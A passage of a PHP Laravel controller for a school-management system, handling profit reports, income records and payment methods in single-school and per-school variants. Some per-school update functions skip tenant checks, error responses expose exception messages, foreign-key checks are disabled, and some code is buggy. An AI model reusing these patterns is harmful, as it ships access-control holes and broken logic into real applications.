            DB::rollback();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Something went wrong, please try again.');
            }
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Fees_fward(Request $request)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Fees_fward(Request $request, $school_id)
    {
        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.feesCollection.fees_forward', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function profit(Request $request)
    {
        try {
            $add_incomes = AramiscAddIncome::where('active_status', 1)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('active_status', 1)->sum('amount');
            $item_sells = AramiscItemSell::where('active_status', 1)->sum('total_paid');

            $total_income = $add_incomes + $fees_payments + $item_sells;

            $add_expenses = AramiscAddExpense::where('active_status', 1)->sum('amount');
            $item_receives = AramiscItemReceive::where('active_status', 1)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('active_status', 1)->where('payroll_status', 'P')->sum('net_salary');

            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_profit(Request $request, $school_id)
    {
        try {
            $add_incomes = AramiscAddIncome::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_sells = AramiscItemSell::where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');

            $total_income = $add_incomes + $fees_payments + $item_sells;

            $add_expenses = AramiscAddExpense::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_receives = AramiscItemReceive::where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('active_status', 1)->where('payroll_status', 'P')->where('school_id',$school_id)->sum('net_salary');

            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function searchProfitByDate(Request $request)
    {
        try {
            date_default_timezone_set("Asia/Dhaka");

            $date_from = date('Y-m-d', strtotime($request->date_from));
            $date_to = date('Y-m-d', strtotime($request->date_to));

            $date_time_from = date('Y-m-d H:i:s', strtotime($request->date_from));
            $date_time_to = date('Y-m-d H:i:s', strtotime($request->date_to . ' ' . '23:59:00'));
            // Income
            $add_incomes = AramiscAddIncome::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->sum('amount');
            $item_sells = AramiscItemSell::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->sum('total_paid');
            $total_income = $add_incomes + $fees_payments + $item_sells;



            // expense
            $add_expenses = AramiscAddExpense::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->sum('amount');
            $item_receives = AramiscItemReceive::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->where('payroll_status', 'P')->sum('net_salary');


            // total profit
            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                $data['date_from'] = $date_from;
                $data['date_to'] = $date_to;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense', 'date_from', 'date_to'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_searchProfitByDate(Request $request, $school_id)
    {
        try {
            date_default_timezone_set("Asia/Dhaka");

            $date_from = date('Y-m-d', strtotime($request->date_from));
            $date_to = date('Y-m-d', strtotime($request->date_to));

            $date_time_from = date('Y-m-d H:i:s', strtotime($request->date_from));
            $date_time_to = date('Y-m-d H:i:s', strtotime($request->date_to . ' ' . '23:59:00'));
            // Income
            $add_incomes = AramiscAddIncome::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_sells = AramiscItemSell::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');
            $total_income = $add_incomes + $fees_payments + $item_sells;



            // expense
            $add_expenses = AramiscAddExpense::where('date', '>=', $date_from)->where('date', '<=', $date_to)->where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_receives = AramiscItemReceive::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('updated_at', '>=', $date_time_from)->where('updated_at', '<=', $date_time_to)->where('active_status', 1)->where('payroll_status', 'P')->where('school_id',$school_id)->sum('net_salary');


            // total profit
            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                $data['date_from'] = $date_from;
                $data['date_to'] = $date_to;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense', 'date_from', 'date_to'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Accounts_Profit(Request $request)
    {
        try {
            $add_incomes = AramiscAddIncome::where('active_status', 1)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('active_status', 1)->sum('amount');
            $item_sells = AramiscItemSell::where('active_status', 1)->sum('total_paid');

            $total_income = $add_incomes + $fees_payments + $item_sells;

            $add_expenses = AramiscAddExpense::where('active_status', 1)->sum('amount');
            $item_receives = AramiscItemReceive::where('active_status', 1)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('active_status', 1)->where('payroll_status', 'P')->sum('net_salary');

            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Accounts_Profit(Request $request, $school_id)
    {
        try {
            $add_incomes = AramiscAddIncome::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $fees_payments = AramiscFeesPayment::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_sells = AramiscItemSell::where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');

            $total_income = $add_incomes + $fees_payments + $item_sells;

            $add_expenses = AramiscAddExpense::where('active_status', 1)->where('school_id',$school_id)->sum('amount');
            $item_receives = AramiscItemReceive::where('active_status', 1)->where('school_id',$school_id)->sum('total_paid');
            $payroll_payments = AramiscHrPayrollGenerate::where('active_status', 1)->where('payroll_status', 'P')->where('school_id',$school_id)->sum('net_salary');

            $total_expense = $add_expenses + $item_receives + $payroll_payments;

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['total_income'] = $total_income;
                $data['total_expense'] = $total_expense;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.profit', compact('total_income', 'total_expense'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function income_index(Request $request)
    {

        try {
            $add_incomes = AramiscAddIncome::where('active_status', '=', 1)->get();
            $income_heads = AramiscChartOfAccount::where('type', "I")->where('active_status', '=', 1)->get();
            $bank_accounts = AramiscBankAccount::where('active_status', '=', 1)->get();
            $payment_methods = AramiscPaymentMethhod::where('active_status', '=', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['add_incomes'] = $add_incomes->toArray();
                $data['income_heads'] = $income_heads->toArray();
                $data['bank_accounts'] = $bank_accounts->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.accounts.add_income', compact('add_incomes', 'income_heads', 'bank_accounts', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_income_index(Request $request, $school_id)
    {

        try {
            $add_incomes = AramiscAddIncome::where('active_status', '=', 1)->where('school_id',$school_id)->get();
            $income_heads = AramiscChartOfAccount::where('type', "I")->where('active_status', '=', 1)->where('school_id',$school_id)->get();
            $bank_accounts = AramiscBankAccount::where('active_status', '=', 1)->where('school_id',$school_id)->get();
            $payment_methods = AramiscPaymentMethhod::where('active_status', '=', 1)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['add_incomes'] = $add_incomes->toArray();
                $data['income_heads'] = $income_heads->toArray();
                $data['bank_accounts'] = $bank_accounts->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.accounts.add_income', compact('add_incomes', 'income_heads', 'bank_accounts', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function income_store(Request $request)
    {
        $input = $request->all();
        if ($request->payment_method == "3") {
            $validator = Validator::make($input, [
                'income_head' => "required|integer",
                'name' => "required",
                'date' => "required",
                'accounts' => "required|integer",
                'payment_method' => "required|integer",
                'amount' => "required|integer",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        } else {
            $validator = Validator::make($input, [
                'income_head' => "required|integer",
                'name' => "required",
                'date' => "required",
                'payment_method' => "required|integer",
                'amount' => "required|integer",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/add_income/', $fileName);
                $fileName =  'public/uploads/add_income/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            DB::statement('SET FOREIGN_KEY_CHECKS=0;');


            $add_income = new AramiscAddIncome();
            $add_income->name = $request->name;
            $add_income->income_head_id = $request->income_head;
            $add_income->date = $newformat;
            $add_income->payment_method_id = $request->payment_method;
            if ($request->payment_method == "3") {
                $add_income->account_id = $request->accounts;
            }

            $add_income->amount = $request->amount;
            $add_income->file = $fileName;
            $add_income->description = $request->description;
            $result = $add_income->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Income has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_income_store(Request $request)
    {
        $input = $request->all();
        if ($request->payment_method == "3") {
            $validator = Validator::make($input, [
                'income_head' => "required|integer",
                'name' => "required",
                'date' => "required",
                'accounts' => "required|integer",
                'payment_method' => "required|integer",
                'amount' => "required|integer",
                'school_id' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        } else {
            $validator = Validator::make($input, [
                'income_head' => "required|integer",
                'name' => "required",
                'date' => "required",
                'payment_method' => "required|integer",
                'amount' => "required|integer",
                'school_id' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/add_income/', $fileName);
                $fileName =  'public/uploads/add_income/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            DB::statement('SET FOREIGN_KEY_CHECKS=0;');


            $add_income = new AramiscAddIncome();
            $add_income->name = $request->name;
            $add_income->income_head_id = $request->income_head;
            $add_income->date = $newformat;
            $add_income->payment_method_id = $request->payment_method;
            if ($request->payment_method == "3") {
                $add_income->account_id = $request->accounts;
            }

            $add_income->amount = $request->amount;
            $add_income->file = $fileName;
            $add_income->description = $request->description;
            $add_income->school_id = $request->school_id;
            $result = $add_income->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success', 'Income has been created successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function income_edit(Request $request, $id)
    {

        try {
            $add_income = AramiscAddIncome::find($id);
            $add_incomes = AramiscAddIncome::where('active_status', 1)->get();
            $income_heads = AramiscChartOfAccount::where('active_status', '=', 1)->get();
            $bank_accounts = AramiscBankAccount::where('active_status', '=', 1)->get();
            $payment_methods = AramiscPaymentMethhod::where('active_status', '=', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['add_income'] = $add_income->toArray();
                $data['add_incomes'] = $add_incomes->toArray();
                $data['income_heads'] = $income_heads->toArray();
                $data['bank_accounts'] = $bank_accounts->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.add_income', compact('add_income', 'add_incomes', 'income_heads', 'bank_accounts', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_income_edit(Request $request,$school_id, $id)
    {

        try {
            $add_income = AramiscAddIncome::where('school_id',$school_id)->find($id);
            $add_incomes = AramiscAddIncome::where('active_status', 1)->where('school_id',$school_id)->get();
            $income_heads = AramiscChartOfAccount::where('active_status', '=', 1)->where('school_id',$school_id)->get();
            $bank_accounts = AramiscBankAccount::where('active_status', '=', 1)->where('school_id',$school_id)->get();
            $payment_methods = AramiscPaymentMethhod::where('active_status', '=', 1)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['add_income'] = $add_income->toArray();
                $data['add_incomes'] = $add_incomes->toArray();
                $data['income_heads'] = $income_heads->toArray();
                $data['bank_accounts'] = $bank_accounts->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.add_income', compact('add_income', 'add_incomes', 'income_heads', 'bank_accounts', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function income_update(Request $request)
    {
        $input = $request->all();
        if ($request->payment_method == "3") {
            $validator = Validator::make($input, [
                'income_head' => "required",
                'name' => "required",
                'date' => "required",
                'accounts' => "required",
                'payment_method' => "required",
                'amount' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        } else {
            $validator = Validator::make($input, [
                'income_head' => "required",
                'name' => "required",
                'date' => "required",
                'payment_method' => "required",
                'amount' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fileName = "";
            if ($request->file('file') != "") {

                $add_income = AramiscAddIncome::find($request->id);
                if ($add_income->file != "") {
                    unlink($add_income->file);
                }

                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/add_income/', $fileName);
                $fileName =  'public/uploads/add_income/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            DB::statement('SET FOREIGN_KEY_CHECKS=0;');

            $add_income = AramiscAddIncome::find($request->id);
            $add_income->name = $request->name;
            $add_income->income_head_id = $request->income_head;
            $add_income->date = $newformat;
            $add_income->payment_method_id = $request->payment_method;
            if ($request->payment_method == "3") {
                $add_income->account_id = $request->accounts;
            }
            $add_income->amount = $request->amount;
            if ($request->file('file') != "") {
                $add_income->file = $fileName;
            }
            $add_income->description = $request->description;
            $result = $add_income->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('add-income')->with('message-success', 'Income has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_income_update(Request $request)
    {
        $input = $request->all();
        if ($request->payment_method == "3") {
            $validator = Validator::make($input, [
                'income_head' => "required",
                'name' => "required",
                'date' => "required",
                'accounts' => "required",
                'payment_method' => "required",
                'amount' => "required",
                'school_id' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        } else {
            $validator = Validator::make($input, [
                'income_head' => "required",
                'name' => "required",
                'date' => "required",
                'payment_method' => "required",
                'amount' => "required",
                'school_id' => "required",
                'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {

                $add_income = AramiscAddIncome::find($request->id);
                if ($add_income->file != "") {
                    unlink($add_income->file);
                }

                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/add_income/', $fileName);
                $fileName =  'public/uploads/add_income/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            DB::statement('SET FOREIGN_KEY_CHECKS=0;');

            $add_income = AramiscAddIncome::find($request->id);
            $add_income->name = $request->name;
            $add_income->income_head_id = $request->income_head;
            $add_income->date = $newformat;
            $add_income->payment_method_id = $request->payment_method;
            if ($request->payment_method == "3") {
                $add_income->account_id = $request->accounts;
            }
            $add_income->amount = $request->amount;
            if ($request->file('file') != "") {
                $add_income->file = $fileName;
            }
            $add_income->description = $request->description;
            $add_income->school_id = $request->school_id;
            $result = $add_income->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect('add-income')->with('message-success', 'Income has been updated successfully');
                } else {
                    return redirect()->back()->with('message-danger', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function income_delete(Request $request)
    {

        try {
            $add_income = AramiscAddIncome::find($request->id);
            if ($add_income->file != "") {
                unlink($add_income->file);
            }
            DB::statement('SET FOREIGN_KEY_CHECKS=0;');
            $result = $add_income->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success-delete', 'Income has been deleted successfully');
                } else {
                    return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_income_delete(Request $request, $school_id)
    {

        try {
            $add_income = AramiscAddIncome::where('school_id',$school_id)->where('id',$request->id)->find();
            if ($add_income->file != "") {
                unlink($add_income->file);
            }
            DB::statement('SET FOREIGN_KEY_CHECKS=0;');
            $result = $add_income->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Income has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    return redirect()->back()->with('message-success-delete', 'Income has been deleted successfully');
                } else {
                    return redirect()->back()->with('message-danger-delete', 'Something went wrong, please try again');
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function payment_index(Request $request)
    {

        try {
            $payment_methods = AramiscPaymentMethhod::all();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($payment_methods, null);
            }
            return view('backEnd.accounts.payment_method', compact('payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_payment_index(Request $request, $school_id)
    {

        try {
            $payment_methods = AramiscPaymentMethhod::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($payment_methods, null);
            }
            return view('backEnd.accounts.payment_method', compact('payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function payment_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'method' => "required|unique:aramisc_payment_methhods,method",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $payment_method = new AramiscPaymentMethhod();
            $payment_method->method = $request->method;
            $result = $payment_method->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {

                    return ApiBaseMethod::sendResponse(null, 'Method has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_payment_store(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'method' => "required|unique:aramisc_payment_methhods,method",
            'school_id' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $payment_method = new AramiscPaymentMethhod();
            $payment_method->method = $request->method;
            $payment_method->school_id = $request->school_id;
            $result = $payment_method->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {

                    return ApiBaseMethod::sendResponse(null, 'Method has been created successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function payment_edit(Request $request, $id)
    {

        try {
            $payment_method = AramiscPaymentMethhod::find($id);
            $payment_methods = AramiscPaymentMethhod::all();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['payment_method'] = $payment_method->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.payment_method', compact('payment_method', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_payment_edit(Request $request,$school_id, $id)
    {

        try {
            $payment_method = AramiscPaymentMethhod::where('school_id',$school_id)->find($id);
            $payment_methods = AramiscPaymentMethhod::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['payment_method'] = $payment_method->toArray();
                $data['payment_methods'] = $payment_methods->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.accounts.payment_method', compact('payment_method', 'payment_methods'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function payment_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'method' => "required|unique:aramisc_payment_methhods,method," . $request->id,
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $payment_method = AramiscPaymentMethhod::find($request->id);
            $payment_method->method = $request->method;
            $result = $payment_method->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Method has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('payment-method');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_payment_update(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'method' => "required|unique:aramisc_payment_methhods,method," . $request->id,
            'school_id' => "required",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $payment_method = AramiscPaymentMethhod::find($request->id);
            $payment_method->method = $request->method;
            $payment_method->school_id = $request->school_id;
            $result = $payment_method->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Method has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
